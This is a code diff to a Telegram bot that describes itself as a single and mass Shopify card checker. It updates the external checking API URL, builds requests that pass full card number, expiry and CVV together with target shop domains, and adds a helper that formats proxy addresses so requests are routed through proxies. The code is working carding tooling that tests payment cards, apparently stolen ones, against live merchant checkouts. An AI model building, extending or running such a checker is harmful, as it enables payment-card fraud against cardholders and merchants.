@@ -1,10 +1,10 @@
 """
-sh.py  v22  —  /sh single-card + /msh mass Shopify checker
+sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://goshopi.up.railway.app/shopii
-            GET ?site=DOMAIN&cc=cc|mm|yy|cvv&proxy=ip:port
-            proxy = raw ip:port  (NO http:// prefix)
+API       : https://shopicardx.up.railway.app/shopii
+            GET ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
+            proxy = http://ip:port  (WITH http:// prefix)
 
 ROOT-CAUSE FIX:
   The API ALWAYS returns HTTP 200. Errors come in the JSON body:
@@ -65,7 +65,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://goshopi.up.railway.app/shopii"
+API_URL       = "https://shopicardx.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -1201,11 +1201,24 @@ def _parse_response_field(data: dict) -> str:
     return "Unknown Error"
 
 
+def _proxy_url(proxy: Optional[str]) -> Optional[str]:
+    """Ensure proxy has http:// prefix as required by the new API."""
+    if not proxy:
+        return None
+    p = proxy.strip()
+    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
+        return p
+    return f"http://{p}"
+
+
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    site = _strip_scheme(site)
-    url  = (f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
-            if proxy else f"{API_URL}?site={site}&cc={card}")
+    # New API: ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
+    site_clean = _strip_scheme(site)          # remove any existing scheme first
+    site_url   = f"https://{site_clean}"      # add https:// as new API requires
+    px         = _proxy_url(proxy)
+    url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
+           if px else f"{API_URL}?cc={card}&site={site_url}")
     _to  = aiohttp.ClientTimeout(total=timeout, connect=12, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
